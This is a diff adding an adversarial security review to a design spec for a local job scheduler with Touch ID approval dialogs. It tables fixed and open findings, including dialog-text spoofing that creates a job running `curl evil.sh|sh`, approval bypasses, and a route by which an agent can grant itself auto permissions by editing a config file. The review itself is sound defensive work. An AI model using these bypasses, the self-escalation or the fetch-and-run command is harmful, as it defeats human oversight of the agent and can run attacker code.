@@ -380,3 +380,50 @@ satisfy its dialog.** A build that could self-approve would be a bypass, and mal
 
 So `docs/spikes/auth-verify.sh` (8 steps, 5 dialogs) is not an outstanding implementation task. It
 is the human half of a two-party protocol, and the machine half is complete.
+
+
+## Adversarial review, 2026-07-26 — findings and what was done
+
+Two reviewers were pointed at the implementation with instructions to break it, not
+to confirm it. **The token and header layers held**: ~150 crafted probes (header
+parsing, route-shape variants, Host/Origin spoofing, Content-Type variants, static
+traversal) produced no bypass. **The approval layer did not hold**, and the fixes
+below are the result.
+
+### Fixed
+
+| # | Finding | Why it mattered |
+|---|---|---|
+| 1 | **`claudePath` gate guarded a key the API never writes.** It is an *extension* setting, so the real path is `{extensions:{claude:{claudePath}}}`; the gate checked a top-level key. Measured: extension-shaped write changed it with **zero prompts**; the top-level shape prompted and wrote nothing | **A complete Layer-2 bypass** — verbatim the one this spec calls "the most important entry in the table". Worse than no gate, since it also trained the user to approve a meaningless dialog |
+| 2 | **One dialog could approve two actions.** The queue re-checked grace on reaching the front, keyed on the capability token — of which there is exactly one, so every caller is the same grace principal | An attacker takes the dialog, the user's request queues, the user approves what they think is theirs, and the attacker's grace waves the user's request through. One fingerprint, two actions |
+| 3 | **Dialog-text spoofing.** Job names have no length or character restriction and reached the sheet verbatim | A crafted name made the sheet read "This is a routine macOS security update. Touch ID to continue." while creating a job running `curl evil.sh\|sh`. Converts Layer 2 into "human presence, misinformed" — worse than no dialog for a user who has learned to trust it |
+| 4 | **The audit log was never written.** `lib/approval.js` emits `prompt`/`approval`; `server.js` subscribed to `asked`/`result` and read a field no payload carries | Nothing about any approval reached `daemon.log`, including the tamper report this spec promises to log loudly |
+| 5 | **`POST /api/budget/plan/apply` force-enabled jobs, ungated** | Overrode the deliberate disable gesture and installed recurring fires |
+| 6 | **Per-row deletes ungated while `/api/cleanup` was gated** | A loop over `DELETE /api/jobs/:id` reached the identical end state with no dialog |
+| 7 | **`isOnlyDisabling` never returned true** — it compared a `validateJob` result against a database row | Every disable raised a prompt, which is the reflexive-approval training this spec refuses to accept for a manual run. The test that denied it filtered out the prompt under test |
+
+Two process notes worth keeping, because both are patterns rather than incidents:
+
+- **A test that cannot fail is worse than no test**, and this happened twice. The
+  first spoofing test exercised the helper function directly and so stayed green when
+  the call to it was deleted; the disable test filtered out the very prompt it was
+  checking. Both were caught by mutation checks, not by review.
+- **My first placement of the project-delete gate sat *after* the loop that deletes
+  every bead-backed job and unlinks their logs** — it would have destroyed the data
+  and then asked permission. The write-before-gate bug this spec forbids, introduced
+  by me while fixing something else, and caught by reading the result instead of
+  trusting the patch.
+
+### Known and NOT fixed, with the reasoning
+
+| Finding | Why it is left | Severity |
+|---|---|---|
+| **Substituting the helper binary defeats the layer.** `available()` is `existsSync` and nothing more; `swiftc` gives an attacker's own binary a valid adhoc signature, so the "137 detects tampering" property only catches *patching* a signed binary, not *replacing* it | Requires same-user code, which this spec deprioritises for the reason in the threat model. Honest correction to the earlier claim: "no local process can satisfy its dialog" is true of the **dialog** and false of the **gate**, which trusts an exit code from a path it never authenticates. Pinning a hash would raise the bar but not close it — the pin lives in the same trust domain | Real, accepted |
+| **An agent can grant itself `permMode: auto`** by editing `.scheduler.json` in a repo it already has write access to; every poll re-reads it | The human approved *activation*, not "auto permissions forever", so this is a genuine escalation. Fixing it needs the poller to refuse a *widening* of `permMode` relative to activation time, which touches `lib/projects.js` and deserves its own tests | Real, deferred — highest-priority remaining item |
+| **`sessionId` is interpolated unescaped** into an AppleScript `do script` in the claude extension's resume action | Latent: `sessionId` comes only from the CLI's own stream-json and no route writes `runs.meta`. But it invalidates this spec's stated reason for leaving `/api/runs/:id/actions/:actionId` ungated — "a client can only pick from a declared set" is true of the action *id*, not of what the action then does | Latent, should be fixed |
+| **No `finally` around the queue's `inFlight` flag** | A throwing event listener would wedge the layer permanently. Not attacker-reachable today, but it is the wrong shape for the variable that decides whether anyone can ever be prompted again | Latent |
+| **Route-enumeration test only sees `/api`-prefixed literals** | A route added as `app.get('/health')` would be invisible to the test *and* uncovered by `app.use('/api')`. Should assert against the live router stack instead of the source text | Latent, cheap to fix |
+| **`express.static` follows symlinks out of `public/`** | `public/` has none today, and it is the one unauthenticated surface. A startup assertion or a realpath check would close it | Latent |
+| **`Origin` is checked more loosely than `Host`** — scheme and port ignored, and normalising forms like `http://127.1` accepted where the `Host` equivalent is rejected | No exploit: `Host` is the guard that actually stops rebinding, and it is strict. The asymmetry is undocumented rather than dangerous | Cosmetic |
+| **`Bearer` matching is case-sensitive** (RFC 7235 says the scheme is case-insensitive) | Fails closed, and every shipped client sends `Bearer`. The 401 copy would misdirect a third-party caller, which is the real cost | Interop |
+| **`approval: null` in `createApp` means "unenforced"** | `main()` always passes one, but "omitted → open" and "helper missing → closed" are a typo apart, and only one is announced at boot | Hardening |
